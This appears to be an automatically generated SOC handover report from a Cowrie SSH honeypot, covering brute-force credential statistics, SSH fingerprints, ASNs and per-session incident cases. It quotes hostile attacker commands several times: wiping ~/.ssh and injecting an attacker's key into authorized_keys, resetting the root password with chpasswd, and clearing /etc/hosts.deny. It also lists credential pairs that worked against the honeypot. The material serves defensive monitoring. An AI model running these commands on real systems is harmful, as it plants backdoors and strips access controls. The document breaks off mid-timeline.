# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-13 |
| **Generated At** | 2026-04-13T09:53:33Z |
| **Shift Time** | 09:53 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **338** |
| Confirmed Threats | **336** |
| False Positives Filtered | **2** (0.6%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **11** |
| High Severity Cases | **119** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **219** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **241** |
| Unique Credential Pairs | **82** |
| Unique Usernames | **30** |
| Unique Passwords | **79** |
| Successful Auth Pairs | **72** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 118 |
| `345gs5662d34` | 53 |
| `ubuntu` | 10 |
| `user` | 6 |
| `postgres` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 55 |
| `345gs5662d34` | 53 |
| `test` | 4 |
| `87654321` | 3 |
| `12345qwert` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 55 |
| `345gs5662d34` | `345gs5662d34` | 53 |
| `ubuntu` | `87654321` | 3 |
| `test` | `12345qwert` | 3 |
| `notify` | `notify` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qwe#123` | `102.88.137.145` | 2026-04-13T06:13:11 |
| `root` | `3245gs5662d34` | `102.88.137.145` | 2026-04-13T06:13:18 |
| `root` | `P@ssWord123` | `103.123.53.88` | 2026-04-13T06:13:58 |
| `root` | `3245gs5662d34` | `103.123.53.88` | 2026-04-13T06:14:00 |
| `root` | `showmethemoney` | `102.88.137.145` | 2026-04-13T06:16:57 |
| `root` | `Asdf@1234` | `177.70.6.158` | 2026-04-13T06:17:01 |
| `root` | `3245gs5662d34` | `177.70.6.158` | 2026-04-13T06:17:08 |
| `root` | `Qwert2026` | `103.123.53.88` | 2026-04-13T06:17:32 |
| `root` | `showmethemoney` | `177.70.6.158` | 2026-04-13T06:18:50 |
| `root` | `XXbb112233` | `14.103.46.177` | 2026-04-13T06:19:10 |
| `root` | `Qwe12345678` | `14.103.117.91` | 2026-04-13T06:20:21 |
| `root` | `123qweASD` | `177.70.6.158` | 2026-04-13T06:20:46 |
| `root` | `asd123456` | `177.70.6.158` | 2026-04-13T06:22:42 |
| `root` | `Asdf@1234` | `112.216.108.62` | 2026-04-13T06:22:44 |
| `root` | `3245gs5662d34` | `112.216.108.62` | 2026-04-13T06:22:48 |
| `root` | `Qazwsx01@` | `14.103.46.177` | 2026-04-13T06:23:47 |
| `root` | `3245gs5662d34` | `14.103.46.177` | 2026-04-13T06:23:53 |
| `root` | `root9999$` | `103.123.53.88` | 2026-04-13T06:24:27 |
| `root` | `123.com.CN` | `103.123.53.88` | 2026-04-13T06:26:09 |
| `root` | `asd123456` | `102.88.137.145` | 2026-04-13T06:26:17 |
| `root` | `ABcd1234` | `112.216.108.62` | 2026-04-13T06:27:45 |
| `root` | `1234567` | `103.123.53.88` | 2026-04-13T06:27:58 |
| `root` | `zxc123456` | `103.123.53.88` | 2026-04-13T06:29:45 |
| `root` | `Aa123456+` | `102.88.137.145` | 2026-04-13T06:30:03 |
| `root` | `123qweASD` | `112.216.108.62` | 2026-04-13T06:31:04 |
| `root` | `Aa123456+` | `177.70.6.158` | 2026-04-13T06:31:33 |
| `root` | `QQ123456@` | `102.88.137.145` | 2026-04-13T06:31:53 |
| `root` | `N2dos2025sd` | `14.103.117.91` | 2026-04-13T06:33:16 |
| `root` | `123789` | `103.123.53.88` | 2026-04-13T06:33:18 |
| `root` | `qazwsx888..` | `177.70.6.158` | 2026-04-13T06:33:23 |
| `root` | `3245gs5662d34` | `14.103.117.91` | 2026-04-13T06:33:27 |
| `root` | `QQ123456@` | `112.216.108.62` | 2026-04-13T06:33:34 |
| `root` | `Qwerty654321` | `103.123.53.88` | 2026-04-13T06:35:04 |
| `root` | `123456@qwer` | `177.70.6.158` | 2026-04-13T06:35:20 |
| `root` | `123qweASD` | `102.88.137.145` | 2026-04-13T06:35:43 |
| `root` | `1qaz!QAZ@` | `177.70.6.158` | 2026-04-13T06:37:21 |
| `root` | `qazwsx888..` | `102.88.137.145` | 2026-04-13T06:37:34 |
| `root` | `Ai123456` | `103.123.53.88` | 2026-04-13T06:38:28 |
| `root` | `Aa123456+` | `112.216.108.62` | 2026-04-13T06:38:46 |
| `root` | `ABcd1234` | `177.70.6.158` | 2026-04-13T06:39:17 |
| `root` | `1qaz!QAZ@` | `102.88.137.145` | 2026-04-13T06:39:27 |
| `root` | `1qaz!QAZ@` | `112.216.108.62` | 2026-04-13T06:40:30 |
| `root` | `ZAQ!2wsx54321!@` | `102.88.137.145` | 2026-04-13T06:41:21 |
| `root` | `Qwe#123` | `112.216.108.62` | 2026-04-13T06:42:11 |
| `root` | `123456@qwer` | `102.88.137.145` | 2026-04-13T06:43:15 |
| `root` | `QQ123456@` | `177.70.6.158` | 2026-04-13T06:46:24 |
| `root` | `ABcd1234` | `102.88.137.145` | 2026-04-13T06:46:57 |
| `root` | `Root654321$` | `180.184.38.93` | 2026-04-13T07:30:18 |
| `root` | `Qazwsx2026@` | `180.76.98.88` | 2026-04-13T07:37:42 |
| `root` | `Lo123456` | `180.76.98.88` | 2026-04-13T07:45:02 |
| `root` | `3245gs5662d34` | `180.76.98.88` | 2026-04-13T07:45:24 |
| `root` | `Password2025!` | `180.76.98.88` | 2026-04-13T07:45:55 |
| `root` | `3edc$RFV5tgb` | `124.163.255.210` | 2026-04-13T07:48:18 |
| `root` | `Zhang@123` | `124.163.255.210` | 2026-04-13T07:57:34 |
| `root` | `server123` | `124.163.255.210` | 2026-04-13T07:59:22 |
| `root` | `root000!@#` | `223.197.248.209` | 2026-04-13T09:25:12 |
| `root` | `3245gs5662d34` | `223.197.248.209` | 2026-04-13T09:25:16 |
| `root` | `147852` | `76.79.213.69` | 2026-04-13T09:26:20 |
| `root` | `3245gs5662d34` | `76.79.213.69` | 2026-04-13T09:26:27 |
| `root` | `Qazwsx123#$` | `223.197.248.209` | 2026-04-13T09:30:01 |
| `root` | `123456wW` | `76.79.213.69` | 2026-04-13T09:30:23 |
| `root` | `147852` | `223.197.248.209` | 2026-04-13T09:33:13 |
| `root` | `www.126.com` | `76.79.213.69` | 2026-04-13T09:33:14 |
| `root` | `root000!@#` | `76.79.213.69` | 2026-04-13T09:35:58 |
| `root` | `!QAZzaq1` | `76.79.213.69` | 2026-04-13T09:38:59 |
| `root` | `Huawei@12` | `223.197.248.209` | 2026-04-13T09:39:39 |
| `root` | `Huawei@12` | `76.79.213.69` | 2026-04-13T09:40:27 |
| `root` | `www.126.com` | `223.197.248.209` | 2026-04-13T09:42:51 |
| `root` | `!QAZzaq1` | `223.197.248.209` | 2026-04-13T09:47:32 |
| `root` | `Qazwsx123#$` | `76.79.213.69` | 2026-04-13T09:50:13 |
| `root` | `123456wW` | `223.197.248.209` | 2026-04-13T09:50:39 |
| `root` | `1QAZ2wsx.` | `223.197.248.209` | 2026-04-13T09:52:19 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **338** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 325 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 313 | 14 |
| `713bd9cc9355...` | Mirai/variant | 9 | 1 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 313 | 14 | Modern SSH client |
| `713bd9cc9355...` | libssh | 9 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 3 | 2 | — |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 5 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 55 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:IGrKHStjg94E"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.46.177`, `124.163.255.210`, `180.184.38.93`, `180.76.98.88`, `14.103.117.91`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
```
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
```
Source IPs: `180.76.98.88`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `112.216.108.62`, `14.103.46.177`, `223.197.248.209`, `180.76.98.88`, `14.103.117.91`, `102.88.137.145`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **25** |
| Unique ASNs | **18** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 4 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 3 | HIGH |
| `AS3786` | LG DACOM Corporation | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | MEDIUM |
| `AS29465` | MTN NIGERIA Communication limited | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |
| `AS140641` | YOTTA NETWORK SERVICES PRIVATE LIMITED | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (119)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3f7308cdfea0

| Field | Detail |
|---|---|
| **Source IP** | `14.103.46[.]177` |
| **First Seen** | 2026-04-13 06:12 |
| **Last Seen** | 2026-04-13 06:12 |
| **Session Duration** | 23s |
| **Login Attempts** | 0 |
| **Auth Success** | ❌ No |
| **Commands Executed** | `cat /proc/cpuinfo | grep name | wc -l, echo "root:gonYhc2RqIRH"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;, cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}', free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'` |
| **Download Attempts** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1053.003 · T1057 · T1059.004 · T1083 · T1105 · T1489 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:12:50` | `cowrie.session.params` |
| `2026-04-13 06:12:50` | `cowrie.command.input` |
| `2026-04-13 06:12:50` | `cowrie.log.closed` |
| `2026-04-13 06:12:50` | `cowrie.session.params` |
| `2026-04-13 06:12:50` | `cowrie.command.input` |
| `2026-04-13 06:12:50` | `cowrie.log.closed` |
| `2026-04-13 06:12:50` | `cowrie.session.params` |
| `2026-04-13 06:12:50` | `cowrie.command.input` |
| `2026-04-13 06:12:51` | `cowrie.session.file_download` |
| `2026-04-13 06:12:51` | `cowrie.log.closed` |
| `2026-04-13 06:12:51` | `cowrie.session.params` |
| `2026-04-13 06:12:51` | `cowrie.command.input` |
| `2026-04-13 06:12:51` | `cowrie.log.closed` |
| `2026-04-13 06:12:51` | `cowrie.session.params` |
| `2026-04-13 06:12:51` | `cowrie.command.input` |
| `2026-04-13 06:12:52` | `cowrie.log.closed` |
| `2026-04-13 06:12:52` | `cowrie.session.params` |
| `2026-04-13 06:12:52` | `cowrie.command.input` |
| `2026-04-13 06:12:52` | `cowrie.command.input` |
| `2026-04-13 06:12:52` | `cowrie.log.closed` |
| `2026-04-13 06:12:53` | `cowrie.session.params` |
| `2026-04-13 06:12:53` | `cowrie.command.input` |
| `2026-04-13 06:12:53` | `cowrie.log.closed` |
| `2026-04-13 06:12:53` | `cowrie.session.params` |
| `2026-04-13 06:12:53` | `cowrie.command.input` |
| `2026-04-13 06:12:53` | `cowrie.log.closed` |
| `2026-04-13 06:12:54` | `cowrie.session.params` |
| `2026-04-13 06:12:54` | `cowrie.command.input` |
| `2026-04-13 06:12:54` | `cowrie.log.closed` |
| `2026-04-13 06:12:54` | `cowrie.session.params` |
| `2026-04-13 06:12:54` | `cowrie.command.input` |
| `2026-04-13 06:12:54` | `cowrie.log.closed` |
| `2026-04-13 06:12:54` | `cowrie.session.params` |
| `2026-04-13 06:12:54` | `cowrie.command.input` |
| `2026-04-13 06:12:55` | `cowrie.log.closed` |
| `2026-04-13 06:12:55` | `cowrie.session.params` |
| `2026-04-13 06:12:55` | `cowrie.command.input` |
| `2026-04-13 06:12:55` | `cowrie.log.closed` |
| `2026-04-13 06:12:55` | `cowrie.session.params` |
| `2026-04-13 06:12:55` | `cowrie.command.input` |
| `2026-04-13 06:12:55` | `cowrie.log.closed` |
| `2026-04-13 06:12:56` | `cowrie.session.params` |
| `2026-04-13 06:12:56` | `cowrie.command.input` |
| `2026-04-13 06:12:56` | `cowrie.log.closed` |
| `2026-04-13 06:12:57` | `cowrie.session.params` |
| `2026-04-13 06:12:57` | `cowrie.command.input` |
| `2026-04-13 06:12:57` | `cowrie.log.closed` |
| `2026-04-13 06:12:57` | `cowrie.session.params` |
| `2026-04-13 06:12:57` | `cowrie.command.input` |
| `2026-04-13 06:12:57` | `cowrie.log.closed` |
| `2026-04-13 06:12:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.46[.]177` to AbuseIPDB if not already reported
- [ ] Block `14.103.46[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ce8d46b27d5

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:13 |
| **Last Seen** | 2026-04-13 06:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:13:09` | `cowrie.session.connect` |
| `2026-04-13 06:13:09` | `cowrie.client.version` |
| `2026-04-13 06:13:10` | `cowrie.client.kex` |
| `2026-04-13 06:13:11` | `cowrie.login.success` |
| `2026-04-13 06:13:12` | `cowrie.session.params` |
| `2026-04-13 06:13:12` | `cowrie.command.input` |
| `2026-04-13 06:13:12` | `cowrie.command.failed` |
| `2026-04-13 06:13:12` | `cowrie.log.closed` |
| `2026-04-13 06:13:13` | `cowrie.session.params` |
| `2026-04-13 06:13:13` | `cowrie.command.input` |
| `2026-04-13 06:13:13` | `cowrie.session.file_download` |
| `2026-04-13 06:13:13` | `cowrie.log.closed` |
| `2026-04-13 06:13:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfcec6ee778d

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:13 |
| **Last Seen** | 2026-04-13 06:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:13:17` | `cowrie.session.connect` |
| `2026-04-13 06:13:17` | `cowrie.client.version` |
| `2026-04-13 06:13:17` | `cowrie.client.kex` |
| `2026-04-13 06:13:18` | `cowrie.login.success` |
| `2026-04-13 06:13:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5871de02e9e

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:13 |
| **Last Seen** | 2026-04-13 06:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:13:58` | `cowrie.session.connect` |
| `2026-04-13 06:13:58` | `cowrie.client.version` |
| `2026-04-13 06:13:58` | `cowrie.client.kex` |
| `2026-04-13 06:13:58` | `cowrie.login.success` |
| `2026-04-13 06:13:58` | `cowrie.session.params` |
| `2026-04-13 06:13:58` | `cowrie.command.input` |
| `2026-04-13 06:13:58` | `cowrie.command.failed` |
| `2026-04-13 06:13:58` | `cowrie.log.closed` |
| `2026-04-13 06:13:58` | `cowrie.session.params` |
| `2026-04-13 06:13:58` | `cowrie.command.input` |
| `2026-04-13 06:13:58` | `cowrie.session.file_download` |
| `2026-04-13 06:13:58` | `cowrie.log.closed` |
| `2026-04-13 06:14:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad357322cef6

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:14 |
| **Last Seen** | 2026-04-13 06:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:14:00` | `cowrie.session.connect` |
| `2026-04-13 06:14:00` | `cowrie.client.version` |
| `2026-04-13 06:14:00` | `cowrie.client.kex` |
| `2026-04-13 06:14:00` | `cowrie.login.success` |
| `2026-04-13 06:14:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8c8a8d6e7a9

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:16 |
| **Last Seen** | 2026-04-13 06:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:16:55` | `cowrie.session.connect` |
| `2026-04-13 06:16:55` | `cowrie.client.version` |
| `2026-04-13 06:16:56` | `cowrie.client.kex` |
| `2026-04-13 06:16:57` | `cowrie.login.success` |
| `2026-04-13 06:16:58` | `cowrie.session.params` |
| `2026-04-13 06:16:58` | `cowrie.command.input` |
| `2026-04-13 06:16:58` | `cowrie.command.failed` |
| `2026-04-13 06:16:58` | `cowrie.log.closed` |
| `2026-04-13 06:16:59` | `cowrie.session.params` |
| `2026-04-13 06:16:59` | `cowrie.command.input` |
| `2026-04-13 06:16:59` | `cowrie.session.file_download` |
| `2026-04-13 06:16:59` | `cowrie.log.closed` |
| `2026-04-13 06:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb3db1e40b3d

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:16 |
| **Last Seen** | 2026-04-13 06:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:16:59` | `cowrie.session.connect` |
| `2026-04-13 06:16:59` | `cowrie.client.version` |
| `2026-04-13 06:17:00` | `cowrie.client.kex` |
